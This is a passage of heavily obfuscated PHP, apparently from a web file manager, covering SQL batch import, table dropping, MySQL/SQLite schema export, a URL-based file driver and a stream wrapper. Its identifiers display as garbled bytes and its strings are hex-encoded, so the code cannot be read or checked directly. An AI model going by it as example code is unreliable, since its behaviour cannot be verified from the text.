$ÎåÊãô++; $ôÊƒŞ‰Ø[] = rtrim(rtrim(trim($ª½îäù…), $•’ÓÃ¾À[50]), $•’ÓÃ¾À[71]); $´¬û«ØÚ = null; $ËÚêÎµ = strlen($ª½îäù…); $ìÍõ—á += $ËÚêÎµ; if ($ìÍõ—á >= ($™Š—²ğí == 500 ? $°ı”éù : $šáØóíß)) { $´¬û«ØÚ = array_pop($ôÊƒŞ‰Ø); if ($ÎåÊãô > 1) { $ÎåÊãô--; } } if ($ÎåÊãô >= $™Š—²ğí || $´¬û«ØÚ) { $ª½îäù… = $—Ê§’Š­ . implode($•’ÓÃ¾À[50], $ôÊƒŞ‰Ø); if (!$Ş””¨÷ø->execute($ª½îäù…)) { return !1; } if ($¦­¾°èø) { $¦­¾°èø->update($ÎåÊãô); } $ôÊƒŞ‰Ø = array(); $ÎåÊãô = 0; $ìÍõ—á = 0; if ($´¬û«ØÚ) { $ôÊƒŞ‰Ø = array($´¬û«ØÚ); $ÎåÊãô = 1; $ìÍõ—á = $ËÚêÎµ; } } } fclose($—€¼Ùı); if (!empty($ôÊƒŞ‰Ø)) { $ª½îäù… = $—Ê§’Š­ . implode($•’ÓÃ¾À[50], $ôÊƒŞ‰Ø); if (!$Ş””¨÷ø->execute($ª½îäù…)) { return !1; } if ($¦­¾°èø) { $¦­¾°èø->update($ÎåÊãô); } } return !0; } public function dropTable($ï‡Ì¾¥Ø = null) { $ü¹Ğ›ƒ« = $this->model()->db(); $³öÀÆåù = $ï‡Ì¾¥Ø ? array($ï‡Ì¾¥Ø) : $ü¹Ğ›ƒ«->getTables(); if (!$³öÀÆåù) { return; } foreach ($³öÀÆåù as $ï‡Ì¾¥Ø) { if ($ï‡Ì¾¥Ø) { $ï‡Ì¾¥Ø = strtolower($ï‡Ì¾¥Ø); } else { continue; } $ü¹Ğ›ƒ«->execute("\144\x72\157\x70\x20\164\141\x62\154\145\x20\151\146\40\145\x78\x69\163\164\163\x20\x60{$ï‡Ì¾¥Ø}\x60"); } } private function sqlEncode($‚Ìø–¨½) { $Èİ©şù— =& $_SERVER[³·—™¤¢]; $ìåÅÉÚ = array(); foreach ($‚Ìø–¨½ as $ØœïÀÏÆ) { if (is_array($ØœïÀÏÆ)) { $ØœïÀÏÆ = json_encode_force($ØœïÀÏÆ); } $ØœïÀÏÆ = addslashes($ØœïÀÏÆ); $ØœïÀÏÆ = str_replace(array($Èİ©şù—[1101], $Èİ©şù—[231]), array($Èİ©şù—[1102], $Èİ©şù—[1103]), $ØœïÀÏÆ); $ìåÅÉÚ[] = str_replace($Èİ©şù—[58], $Èİ©şù—[1104], $ØœïÀÏÆ); } return $Èİ©şù—[58] . implode($Èİ©şù—[1105], $ìåÅÉÚ) . $Èİ©şù—[58]; } private function sqlDecode($áÏ–­ÂÇ, $Éò’¸–, $¹Ô£ôÒñ = '') { $ıùãÊŒ© =& $_SERVER[³·—™¤¢]; $áÏ–­ÂÇ = str_replace(array($ıùãÊŒ©[1102], $ıùãÊŒ©[1103]), array($ıùãÊŒ©[1101], $ıùãÊŒ©[231]), $áÏ–­ÂÇ); if ($Éò’¸– == $ıùãÊŒ©[13]) { return $¹Ô£ôÒñ != $ıùãÊŒ©[1106] ? stripslashes($áÏ–­ÂÇ) : $áÏ–­ÂÇ; } if ($¹Ô£ôÒñ == $ıùãÊŒ©[1106]) { $áÏ–­ÂÇ = str_replace($ıùãÊŒ©[1107], $ıùãÊŒ©[118], stripslashes($áÏ–­ÂÇ)); } return $áÏ–­ÂÇ; } public function getSqlFile($†Ô­Åğù = '') { $èèÙÍŒ— =& $_SERVER[³·—™¤¢]; $ıâĞ«Êû = $this->dbType(!0); $ñ‰»ìÎ¹ = CONTROLLER_DIR . "\151\156\x73\164\141\154\x6c\x2f\144\141\164\x61\57{$ıâĞ«Êû}\56\x73\161\x6c"; $ÒÒÄÕò® = file_get_contents($ñ‰»ìÎ¹); $çêıÀéà = $èèÙÍŒ—[1108] . ($ıâĞ«Êû == $èèÙÍŒ—[824] ? $èèÙÍŒ—[1109] : $èèÙÍŒ—[1110]) . $èèÙÍŒ—[1111]; preg_match_all($çêıÀéà, $ÒÒÄÕò®, $ğ‚ú¡´); $·¨·óø  = $ğ‚ú¡´[1]; $ıÕ³Â³ğ = $this->model()->db(); $üÎ¸ÖÌ¬ = $ıÕ³Â³ğ->getTables(); $˜Õ•Ó¤© = TEMP_FILES . $èèÙÍŒ—[1112] . date($èèÙÍŒ—[771]) . $èèÙÍŒ—[8]; del_dir($˜Õ•Ó¤©); mk_dir($˜Õ•Ó¤©); $ËÒÒ£±Ó = $˜Õ•Ó¤© . $èèÙÍŒ—[1113]; $›ÒÒÌÕ = $˜Õ•Ó¤© . $èèÙÍŒ—[1114]; $«Õ¤ƒŞĞ = $ıâĞ«Êû == $èèÙÍŒ—[13] ? $èèÙÍŒ—[824] : $èèÙÍŒ—[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\x6c\57\x64\141\x74\141\57{$«Õ¤ƒŞĞ}\x2e\163\161\x6c", $˜Õ•Ó¤©); @touch($˜Õ•Ó¤© . $ıâĞ«Êû . $èèÙÍŒ—[808]); $µĞ—”ìÍ = fopen($ËÒÒ£±Ó, $èèÙÍŒ—[1089]); $è°òÇÌ¶ = fopen($›ÒÒÌÕ, $èèÙÍŒ—[1089]); if ($ıâĞ«Êû == $èèÙÍŒ—[13]) { $üÎ¸ÖÌ¬ = array_diff($üÎ¸ÖÌ¬, array($èèÙÍŒ—[804], $èèÙÍŒ—[805])); $£ïóõïâ = array($èèÙÍŒ—[1115], $èèÙÍŒ—[1116], $èèÙÍŒ—[1117]); fwrite($è°òÇÌ¶, implode(PHP_EOL, $£ïóõïâ) . PHP_EOL . PHP_EOL); foreach ($üÎ¸ÖÌ¬ as $úø²Ò¹Ù) { $ØÏÍáí = $this->sqlFromSqlite($úø²Ò¹Ù); if (!$ØÏÍáí[$èèÙÍŒ—[13]]) { continue; } fwrite($è°òÇÌ¶, $ØÏÍáí[$èèÙÍŒ—[13]] . PHP_EOL . PHP_EOL); if (!in_array($úø²Ò¹Ù, $·¨·óø )) { fwrite($µĞ—”ìÍ, $ØÏÍáí[$èèÙÍŒ—[824]] . PHP_EOL . PHP_EOL); } } } else { foreach ($üÎ¸ÖÌ¬ as $úø²Ò¹Ù) { $ØÏÍáí = $this->sqlFromMysql($úø²Ò¹Ù); if (!$ØÏÍáí[$èèÙÍŒ—[824]]) { continue; } fwrite($µĞ—”ìÍ, $ØÏÍáí[$èèÙÍŒ—[824]] . PHP_EOL . PHP_EOL); if (!in_array($úø²Ò¹Ù, $·¨·óø )) { fwrite($è°òÇÌ¶, $ØÏÍáí[$èèÙÍŒ—[13]] . PHP_EOL . PHP_EOL); } } } fclose($µĞ—”ìÍ); fclose($è°òÇÌ¶); $ÒÒÄÕò® = array($èèÙÍŒ—[824] => $ËÒÒ£±Ó, $èèÙÍŒ—[13] => $›ÒÒÌÕ); return $†Ô­Åğù ? $ÒÒÄÕò®[$†Ô­Åğù] : $ÒÒÄÕò®; } public function dbType($ß¢ÂØ´ñ = false) { $ºèâìÇ„ =& $_SERVER[³·—™¤¢]; $¢ÖÑŒ› = $ß¢ÂØ´ñ ? $GLOBALS[$ºèâìÇ„[6]][$ºèâìÇ„[21]] : $this->database; $¢ÖÑŒ› = array_change_key_case($¢ÖÑŒ›); $å””±ë± = $¢ÖÑŒ›[$ºèâìÇ„[990]]; if ($å””±ë± == $ºèâìÇ„[987]) { $†„–ß¯Ö = explode($ºèâìÇ„[4], $¢ÖÑŒ›[$ºèâìÇ„[996]]); $å””±ë± = $†„–ß¯Ö[0]; } $²…Ÿ³Ùê = array($ºèâìÇ„[1118] => $ºèâìÇ„[13], $ºèâìÇ„[932] => $ºèâìÇ„[824]); if (isset($²…Ÿ³Ùê[$å””±ë±])) { $å””±ë± = $²…Ÿ³Ùê[$å””±ë±]; } return $å””±ë±; } public function sqlFromMysql($¾ÑÀÏæ€, $ÎÕµ²„İ = '') { $è°Î‘§£ =& $_SERVER[³·—™¤¢]; $“Æ¥ä·¥ = $this->model()->db(); $®·³Å½¯ = $“Æ¥ä·¥->query($è°Î‘§£[1119] . $¾ÑÀÏæ€ . $è°Î‘§£[385]); if (!$®·³Å½¯ || !$®·³Å½¯[0]) { return !1; } $Êõ¹ ‰ = _get($®·³Å½¯[0], $è°Î‘§£[1120], $è°Î‘§£[12]); if (!$Êõ¹ ‰) { return !1; } $ĞÔ‰èêÊ = "\x44\x52\117\x50\40\x54\x41\102\114\105\x20\x49\x46\x20\x45\130\111\x53\x54\x53\x20\140{$¾ÑÀÏæ€}\140\x3b" . PHP_EOL . $Êõ¹ ‰ . $è°Î‘§£[71]; if ($ÎÕµ²„İ && $ÎÕµ²„İ == $è°Î‘§£[824]) { return $ĞÔ‰èêÊ; } $ñ©Î¿ˆ› = array_change_key_case($GLOBALS[$è°Î‘§£[6]][$è°Î‘§£[21]]); $ªÌãÁêê = $ñ©Î¿ˆ›[$è°Î‘§£[995]]; $âŞ‚ƒ£“ = $è°Î‘§£[1121] . $ªÌãÁêê . $è°Î‘§£[1122] . $¾ÑÀÏæ€ . $è°Î‘§£[58]; $ÕÄ•ôµ¶ = $è°Î‘§£[1123] . $¾ÑÀÏæ€ . $è°Î‘§£[920]; $ü«Ò¨íç = $“Æ¥ä·¥->query($âŞ‚ƒ£“); if (empty($ü«Ò¨íç)) { $ôÉì¬˜‰ = array($è°Î‘§£[824] => $è°Î‘§£[12], $è°Î‘§£[13] => $è°Î‘§£[12]); return $ÎÕµ²„İ ? $ôÉì¬˜‰[$ÎÕµ²„İ] : $ôÉì¬˜‰; } $İÛÏİ  = $“Æ¥ä·¥->query($ÕÄ•ôµ¶); $í¨­òÙ = $è°Î‘§£[12]; $å«™úÂ× = array(); foreach ($İÛÏİ  as $’‘ğö) { if (!$í¨­òÙ && $’‘ğö[$è°Î‘§£[1124]] == $è°Î‘§£[1125]) { $í¨­òÙ = $’‘ğö[$è°Î‘§£[1126]]; } if (isset($å«™úÂ×[$’‘ğö[$è°Î‘§£[1124]]])) { $å«™úÂ×[$’‘ğö[$è°Î‘§£[1124]]][$è°Î‘§£[1127]][] = $’‘ğö[$è°Î‘§£[1126]]; continue; } $å«™úÂ×[$’‘ğö[$è°Î‘§£[1124]]] = array($è°Î‘§£[1128] => $’‘ğö[$è°Î‘§£[1124]], $è°Î‘§£[1127] => array($’‘ğö[$è°Î‘§£[1126]]), $è°Î‘§£[1129] => $’‘ğö[$è°Î‘§£[1130]] == $è°Î‘§£[88] ? 0 : 1); } $£‹è¯®Ø = array(); foreach ($å«™úÂ× as $’‘ğö) { $·¦¨ü¼ş = $’‘ğö[$è°Î‘§£[1128]] == $è°Î‘§£[1125]; $´îÓçÏÛ = array($è°Î‘§£[1131], $’‘ğö[$è°Î‘§£[1129]] == $è°Î‘§£[88] && !$·¦¨ü¼ş ? $è°Î‘§£[1132] : $è°Î‘§£[12], $è°Î‘§£[1133], $è°Î‘§£[1134] . $¾ÑÀÏæ€ . $è°Î‘§£[11] . ($·¦¨ü¼ş ? $è°Î‘§£[1135] : $’‘ğö[$è°Î‘§£[1128]]) . $è°Î‘§£[118], $è°Î‘§£[1136], $è°Î‘§£[118] . $¾ÑÀÏæ€ . $è°Î‘§£[118], $è°Î‘§£[1137] . implode($è°Î‘§£[1138], $’‘ğö[$è°Î‘§£[1127]]) . $è°Î‘§£[1139]); $£‹è¯®Ø[] = implode($è°Î‘§£[53], $´îÓçÏÛ) . $è°Î‘§£[71]; } $„Íú°çÁ = array(); $áşºâ‹× = array($è°Î‘§£[1140] => $è°Î‘§£[1141], $è°Î‘§£[1141] => $è°Î‘§£[1141], $è°Î‘§£[288] => $è°Î‘§£[315], $è°Î‘§£[287] => $è°Î‘§£[315]); foreach ($ü«Ò¨íç as $’‘ğö) { $´îÓçÏÛ = array($è°Î‘§£[118] . $’‘ğö[$è°Î‘§£[1142]] . $è°Î‘§£[118], isset($áşºâ‹×[$’‘ğö[$è°Î‘§£[1143]]]) ? $áşºâ‹×[$’‘ğö[$è°Î‘§£[1143]]] : $’‘ğö[$è°Î‘§£[1144]], $’‘ğö[$è°Î‘§£[1145]] == $è°Î‘§£[918] ? $è°Î‘§£[1146] : $è°Î‘§£[1147], $’‘ğö[$è°Î‘§£[1142]] == $í¨­òÙ ? $è°Î‘§£[1148] : $è°Î‘§£[12], $’‘ğö[$è°Î‘§£[971]] ? strtoupper(str_replace($è°Î‘§£[11], $è°Î‘§£[12], $’‘ğö[$è°Î‘§£[971]])) : $è°Î‘§£[12]); $„Íú°çÁ[] = trim(implode($è°Î‘§£[53], $´îÓçÏÛ)); } $½¡º†é¨ = array($è°Î‘§£[1149] . $¾ÑÀÏæ€ . $è°Î‘§£[1150], $è°Î‘§£[1151] . $¾ÑÀÏæ€ . $è°Î‘§£[1152], implode($è°Î‘§£[50] . PHP_EOL, $„Íú°çÁ), $è°Î‘§£[968]); $°”¡×ˆü = implode(PHP_EOL, array_merge($½¡º†é¨, $£‹è¯®Ø)); if ($ÎÕµ²„İ && $ÎÕµ²„İ == $è°Î‘§£[13]) { return $°”¡×ˆü; } $ôÉì¬˜‰ = array($è°Î‘§£[824] => $ĞÔ‰èêÊ, $è°Î‘§£[13] => $°”¡×ˆü); return $ÎÕµ²„İ ? $ôÉì¬˜‰[$ÎÕµ²„İ] : $ôÉì¬˜‰; } public function sqlFromSqlite($æ³Ó…¦, $ó¼ËÌÂ’ = '') { $Æ×ôŒÇ =& $_SERVER[³·—™¤¢]; $ıĞ¬—Í‡ = $this->model()->db(); $ÖŸ»“˜‡ = "\120\122\x41\107\115\101\40\x54\101\x42\x4c\105\137\x49\x4e\106\117\40\50\47{$æ³Ó…¦}\x27\x29"; $è“ùÒ = "\x53\x45\114\x45\103\x54\40\x2a\40\x46\122\x4f\x4d\40\163\x71\x6c\151\164\145\137\x6d\141\163\164\145\162\40\127\x48\x45\x52\x45\x20\164\142\x6c\x5f\x6e\x61\x6d\145\40\75\40\47{$æ³Ó…¦}\47"; $®É³ÉüÎ = $ıĞ¬—Í‡->query($ÖŸ»“˜‡); if (empty($®É³ÉüÎ)) { $¦¾¦¢ = array($Æ×ôŒÇ[824] => $Æ×ôŒÇ[12], $Æ×ôŒÇ[13] => $Æ×ôŒÇ[12]); return $ó¼ËÌÂ’ ? $¦¾¦¢[$ó¼ËÌÂ’] : $¦¾¦¢; } $‡ı±í÷ = $ıĞ¬—Í‡->query($è“ùÒ); $íèîç˜¹ = $Üà®ëä… = array(); foreach ($‡ı±í÷ as $ÂŞ€ò) { if ($ÂŞ€ò[$Æ×ôŒÇ[33]] == $Æ×ôŒÇ[279]) { $íèîç˜¹[] = $ÂŞ€ò[$Æ×ôŒÇ[1153]]; } else { $Üà®ëä…[$ÂŞ€ò[$Æ×ôŒÇ[32]]] = $ÂŞ€ò[$Æ×ôŒÇ[1153]]; } } $‘àô«Ì² = array_merge(array($Æ×ôŒÇ[1149] . $æ³Ó…¦ . $Æ×ôŒÇ[118]), $íèîç˜¹, array_values($Üà®ëä…)); $‘àô«Ì² = implode($Æ×ôŒÇ[71] . PHP_EOL, $‘àô«Ì²) . $Æ×ôŒÇ[71]; if ($ó¼ËÌÂ’ && $ó¼ËÌÂ’ == $Æ×ôŒÇ[13]) { return $‘àô«Ì²; } $ƒ·ÖÛ¢¶ = array(); $çì‹£ = array($Æ×ôŒÇ[1141] => $Æ×ôŒÇ[1154], $Æ×ôŒÇ[315] => $Æ×ôŒÇ[1155]); $®‘”¾Û¸ = $Æ×ôŒÇ[12]; foreach ($®É³ÉüÎ as $ÂŞ€ò) { if ($ÂŞ€ò[$Æ×ôŒÇ[57]] == $Æ×ôŒÇ[88]) { $®‘”¾Û¸ = $ÂŞ€ò[$Æ×ôŒÇ[32]]; } $â”§í’ª = array($Æ×ôŒÇ[385] . $ÂŞ€ò[$Æ×ôŒÇ[32]] . $Æ×ôŒÇ[385], isset($çì‹£[$ÂŞ€ò[$Æ×ôŒÇ[33]]]) ? $çì‹£[$ÂŞ€ò[$Æ×ôŒÇ[33]]] : $ÂŞ€ò[$Æ×ôŒÇ[33]], $ÂŞ€ò[$Æ×ôŒÇ[35]] == $Æ×ôŒÇ[88] ? $Æ×ôŒÇ[1146] : $Æ×ôŒÇ[1156] . $ÂŞ€ò[$Æ×ôŒÇ[56]], $ÂŞ€ò[$Æ×ôŒÇ[57]] == $Æ×ôŒÇ[88] ? $Æ×ôŒÇ[1157] : $Æ×ôŒÇ[12]); $ƒ·ÖÛ¢¶[] = trim(implode($Æ×ôŒÇ[53], $â”§í’ª)); } foreach ($Üà®ëä… as $»®ÔÂÃ => $£´å©£) { $ËÉÕ’Æû = str_replace($Æ×ôŒÇ[1158] . $æ³Ó…¦ . $Æ×ôŒÇ[11], $Æ×ôŒÇ[12], $»®ÔÂÃ); $˜œéäğ = str_replace(array($Æ×ôŒÇ[118], $Æ×ôŒÇ[979]), $Æ×ôŒÇ[385], substr($£´å©£, stripos($£´å©£, $Æ×ôŒÇ[260]))); if ($ËÉÕ’Æû == $Æ×ôŒÇ[1135]) { $şÅƒú¢» = $Æ×ôŒÇ[1159] . $®‘”¾Û¸ . $Æ×ôŒÇ[1160]; } else { $şÅƒú¢» = (stripos($ËÉÕ’Æû, $Æ×ôŒÇ[11]) ? $Æ×ôŒÇ[1161] : $Æ×ôŒÇ[12]) . ($Æ×ôŒÇ[1162] . $ËÉÕ’Æû . $Æ×ôŒÇ[1163] . $˜œéäğ); } $ƒ·ÖÛ¢¶[] = $şÅƒú¢»; } $©Éş„ = array($Æ×ôŒÇ[1164] . $æ³Ó…¦ . $Æ×ôŒÇ[1165], $Æ×ôŒÇ[1166] . $æ³Ó…¦ . $Æ×ôŒÇ[1167], implode($Æ×ôŒÇ[50] . PHP_EOL, $ƒ·ÖÛ¢¶), $Æ×ôŒÇ[1168]); $ØÜúÂºÖ = implode(PHP_EOL, $©Éş„); if ($ó¼ËÌÂ’ && $ó¼ËÌÂ’ == $Æ×ôŒÇ[824]) { return $ØÜúÂºÖ; } $¦¾¦¢ = array($Æ×ôŒÇ[824] => $ØÜúÂºÖ, $Æ×ôŒÇ[13] => $‘àô«Ì²); return $ó¼ËÌÂ’ ? $¦¾¦¢[$ó¼ËÌÂ’] : $¦¾¦¢; } } goto EĞìÚŒ¸Ú¶; BÇÖÃæİ´à: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($õ—æ‹ú£ = false) { } public function exist($…é¹§Ïü) { $óëŞıÉ = $this->info($…é¹§Ïü); return $óëŞıÉ[$_SERVER[³·—™¤¢][201]]; } public function isFile($’ó¹æâ¢) { $¶ÂõŞÔ = $this->info($’ó¹æâ¢); return $¶ÂõŞÔ[$_SERVER[³·—™¤¢][201]]; } public function isFolder($Öîæ‰Ü) { return !1; } public function size($Õ¾ˆˆè¿) { $©œ×§¶ = $this->info($Õ¾ˆˆè¿); return $©œ×§¶[$_SERVER[³·—™¤¢][76]]; } public function info($²ÂÁ¾ıš) { return $this->infoParse($²ÂÁ¾ıš); } public function infoAuth($ÁœÙÀ±) { return $this->infoParse($ÁœÙÀ±); } public function infoWithChildren($Ñ¯£«î) { return $this->infoParse($Ñ¯£«î); } public function infoFull($´µ¾èÜ¡) { return $this->infoParse($´µ¾èÜ¡); } private function infoParse($ñ¾†’ïÂ) { $ÖäÒ©èÀ =& $_SERVER[³·—™¤¢]; $ú°–Œ‘á = $this->header($ñ¾†’ïÂ); if (!$ú°–Œ‘á || !$ú°–Œ‘á[$ÖäÒ©èÀ[770]]) { return !1; } $ËÖšáŞâ = _get($ú°–Œ‘á, $ÖäÒ©èÀ[337], 0); $œ ©× = array($ÖäÒ©èÀ[32] => $ú°–Œ‘á[$ÖäÒ©èÀ[32]], $ÖäÒ©èÀ[84] => $ñ¾†’ïÂ, $ÖäÒ©èÀ[33] => $ÖäÒ©èÀ[199], $ÖäÒ©èÀ[76] => intval($ËÖšáŞâ), $ÖäÒ©èÀ[174] => get_path_ext($ú°–Œ‘á[$ÖäÒ©èÀ[32]]), $ÖäÒ©èÀ[1401] => $ËÖšáŞâ > 0 && $ú°–Œ‘á[$ÖäÒ©èÀ[1523]], $ÖäÒ©èÀ[1402] => !1); return $œ ©×; } private function header($‡âìşšÕ) { $¢ıòÕçÉ =& $_SERVER[³·—™¤¢]; if (isset(self::$_cacheHeader[$‡âìşšÕ])) { return self::$_cacheHeader[$‡âìşšÕ]; } $¦ƒÜ‡Í = isset($GLOBALS[$¢ıòÕçÉ[1524]]) ? $GLOBALS[$¢ıòÕçÉ[1524]] : !1; $GLOBALS[$¢ıòÕçÉ[1524]] = !0; self::$_cacheHeader[$‡âìşšÕ] = url_header($‡âìşšÕ); $GLOBALS[$¢ıòÕçÉ[1524]] = $¦ƒÜ‡Í; return self::$_cacheHeader[$‡âìşšÕ]; } public function hashSimple($µƒÖ¿‹”, $Ö‡áõçí = false) { $¶¶Ì—®§ =& $_SERVER[³·—™¤¢]; $˜ÄşÌÎ— = $this->info($µƒÖ¿‹”); if (!$˜ÄşÌÎ— || !$˜ÄşÌÎ—[$¶¶Ì—®§[201]]) { return !1; } $³ÚÖÔ€ = $˜ÄşÌÎ—[$¶¶Ì—®§[76]]; $Ö—“¾¹ı = 200; $—Ñåç›© = 50; if ($³ÚÖÔ€ <= $Ö—“¾¹ı * $—Ñåç›©) { return md5($this->fileSubstr($µƒÖ¿‹”, 0, $³ÚÖÔ€)) . $³ÚÖÔ€; } $õ‘Àë¶¸ = intval($³ÚÖÔ€ / $—Ñåç›©); $°ùœï = $¶¶Ì—®§[12]; $á—ÁöÄŸ = timeFloat(); $”®ĞÄ“› = 15; for ($¯Òõ•óı = 0; $¯Òõ•óı < $—Ñåç›©; $¯Òõ•óı++) { if (timeFloat() - $á—ÁöÄŸ > $”®ĞÄ“›) { return !1; } $ÆÈŒµò = $this->fileSubstr($µƒÖ¿‹”, $õ‘Àë¶¸ * $¯Òõ•óı, $Ö—“¾¹ı); if (!$ÆÈŒµò) { return !1; } $°ùœï .= $ÆÈŒµò; } $°ùœï .= $this->fileSubstr($µƒÖ¿‹”, $³ÚÖÔ€ - $Ö—“¾¹ı, $Ö—“¾¹ı); return md5($°ùœï) . $³ÚÖÔ€; } public function getContent($æ°ŞçïÌ) { return $this->fileSubstr($æ°ŞçïÌ); } public function fileSubstr($—„Ê°–î, $š£¨»Ìá = 0, $¢üÎáÎ = -1) { $¤À­û‘û =& $_SERVER[³·—™¤¢]; $‡‹Õ’ùÚ = $this->info($—„Ê°–î); if (!$‡‹Õ’ùÚ || !$‡‹Õ’ùÚ[$¤À­û‘û[201]] && $‡‹Õ’ùÚ[$¤À­û‘û[76]] > 1024 * 1024 * 10) { return !1; } if ($¢üÎáÎ === -1) { $¢üÎáÎ = $‡‹Õ’ùÚ[$¤À­û‘û[76]]; } if ($¢üÎáÎ == 0) { return $¤À­û‘û[12]; } $¿ßÁö¿ = array($¤À­û‘û[1525] . $š£¨»Ìá . $¤À­û‘û[802] . ($š£¨»Ìá + $¢üÎáÎ - 1)); $×õüƒê… = url_request($—„Ê°–î, $¤À­û‘û[230], !1, $¿ßÁö¿, !1, !1, 1); return $×õüƒê…[$¤À­û‘û[1216]] ? $×õüƒê…[$¤À­û‘û[1216]] : $¤À­û‘û[12]; } public function download($´ú¡†æŒ, $„Õç›û÷) { Downloader::start($´ú¡†æŒ, $„Õç›û÷); return $„Õç›û÷; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($œ×Íò¬ş, $íœ¦Ñ•ª = '') { $this->info = $this->info($œ×Íò¬ş); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[³·—™¤¢][84]]; $this->pathOpen = $œ×Íò¬ş; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$œ×Íò¬ş])) { self::$_chunkBuffer[$œ×Íò¬ş] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($—èªÕµ÷) { $õ¿ªÑ…© = $this->fileSubstr($this->pose, $—èªÕµ÷); $this->pose += strlen($õ¿ªÑ…©); return $õ¿ªÑ…©; } public function stream_tell() { return $this->pose; } public function stream_seek($éŠòµîï, $—Ë¢‡ï¸) { $”¾½‚óª =& $_SERVER[³·—™¤¢]; if ($—Ë¢‡ï¸ == SEEK_SET) { $this->pose = $éŠòµîï; } else { if ($—Ë¢‡ï¸ == SEEK_CUR) { $this->pose += $éŠòµîï; } else { if ($—Ë¢‡ï¸ == SEEK_END) { $this->pose = $this->info[$”¾½‚óª[76]] + intval($éŠòµîï); } } } if ($éŠòµîï < 0) { $this->pose = $this->info[$”¾½‚óª[76]] + $éŠòµîï; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[³·—™¤¢][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÍÙøç», $¶„ø¤÷) { $›¬¾·óˆ =& $_SERVER[³·—™¤¢]; $ éÌÊ¬ = $this->info($ÍÙøç»); return array($›¬¾·óˆ[1526] => 0, $›¬¾·óˆ[1527] => 0, $›¬¾·óˆ[16] => 32768 + 511, $›¬¾·óˆ[1528] => 0, $›¬¾·óˆ[1529] => 0, $›¬¾·óˆ[1530] => 0, $›¬¾·óˆ[1531] => 0, $›¬¾·óˆ[76] => $ éÌÊ¬[$›¬¾·óˆ[76]], $›¬¾·óˆ[1532] => $ éÌÊ¬[$›¬¾·óˆ[1400]], $›¬¾·óˆ[1488] => $ éÌÊ¬[$›¬¾·óˆ[85]], $›¬¾·óˆ[1487] => $ éÌÊ¬[$›¬¾·óˆ[200]], $›¬¾·óˆ[1533] => 0, $›¬¾·óˆ[1534] => 0); } static $fileInfo = array(); public function info($ßŸöïªÆ) { $ÏÀ€‡µ¢ = $_SERVER[³·—™¤¢][1535]; if (isset(self::$fileInfo[$ßŸöïªÆ])) { return self::$fileInfo[$ßŸöïªÆ]; } if (substr($ßŸöïªÆ, 0, strlen($ÏÀ€‡µ¢)) != $ÏÀ€‡µ¢) { return !1; } self::$fileInfo[$ßŸöïªÆ] = IO::info(substr($ßŸöïªÆ, strlen($ÏÀ€‡µ¢))); return self::$fileInfo[$ßŸöïªÆ]; } public static function read($´”¿‡¿ì, $Ú¹ÉÈ€İ, $¨¶Ä˜Ö×) { if (!isset(self::$_fopenCache[$´”¿‡¿ì])) { $™¯Úí¶„ = new StreamWrapperIO(); $™¯Úí¶„->stream_open($´”¿‡¿ì); self::$_fopenCache[$´”¿‡¿ì] = $™¯Úí¶„; } $™¯Úí¶„ = self::$_fopenCache[$´”¿‡¿ì]; return $™¯Úí¶„->fileSubstr($Ú¹ÉÈ€İ, $¨¶Ä˜Ö×); } public static function _read($‚³®ßï, $µ”ğÀ¸ç, $éßû„„®) { $ğŠ½›ô =& $_SERVER[³·—™¤¢]; $âìœÌÍ‚ = fopen($‚³®ßï, $ğŠ½›ô[1404]); if (!$âìœÌÍ‚) { return $ğŠ½›ô[12]; } $ØŠğ˜¡ƒ = 8192; fseek($âìœÌÍ‚, $µ”ğÀ¸ç, SEEK_SET); $È€Şã¡÷ = $ğŠ½›ô[12]; $°ºüïıÒ = 0; while ($°ºüïıÒ < $éßû„„®) { $ß¾ÅÃÁˆ = min($ØŠğ˜¡ƒ, $éßû„„® - $°ºüïıÒ); $È€Şã¡÷ .= fread($âìœÌÍ‚, $ß¾ÅÃÁˆ); $°ºüïıÒ += $ß¾ÅÃÁˆ; } fclose($âìœÌÍ‚); return $È€Şã¡÷; } public function fileSubstr($æùÕƒŞø, $ƒÂå¬æ) { $İµÕëÒÔ =& $_SERVER[³·—™¤¢]; $›·ŠùöÄ = $this->info[$İµÕëÒÔ[76]]; $Øıõ’ø« = $æùÕƒŞø; $Û²‡•ûü = $ƒÂå¬æ; if ($æùÕƒŞø < 0) { $æùÕƒŞø = $›·ŠùöÄ + $æùÕƒŞø; } if ($ƒÂå¬æ === !1) { $ƒÂå¬æ = $›·ŠùöÄ - $æùÕƒŞø; } if ($æùÕƒŞø + $ƒÂå¬æ > $›·ŠùöÄ) { $ƒÂå¬æ = $›·ŠùöÄ - $æùÕƒŞø; } if ($ƒÂå¬æ <= 0) { return $İµÕëÒÔ[12]; } if ($æùÕƒŞø < 0 || $æùÕƒŞø >= $›·ŠùöÄ || $ƒÂå¬æ <= 0 || $ƒÂå¬æ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\x65\122\x65\141\x64\x20\145\x72\x72\x6f\x72\41\x20\x73\x74\x61\x72\164\x3d{$æùÕƒŞø}\x3b\x6c\x65\156\x67\x74\x68\x3d{$ƒÂå¬æ}\x3b\40\x73\x69\x7a\145\75{$›·ŠùöÄ}\73"); } $øöîÑ¥ = 64 * 1024; $¦“ĞÃÂŸ =& self::$_chunkBuffer[$this->path]; if (!$¦“ĞÃÂŸ) { $¦“ĞÃÂŸ = array(); } $Å‰“İãß = 0; $ª¾­·ğ… = 0; $Ê˜íÍ‚ı = $İµÕëÒÔ[12]; foreach ($¦“ĞÃÂŸ as $Å‰“İãß => $Ê˜íÍ‚ı) { $Å‰“İãß = intval($Å‰“İãß); $ª¾­·ğ… = $Å‰“İãß + strlen($Ê˜íÍ‚ı); if ($æùÕƒŞø >= $ª¾­·ğ…) { continue; } if ($æùÕƒŞø >= $Å‰“İãß && $æùÕƒŞø + $ƒÂå¬æ <= $ª¾­·ğ…) { return substr($Ê˜íÍ‚ı, $æùÕƒŞø - $Å‰“İãß, 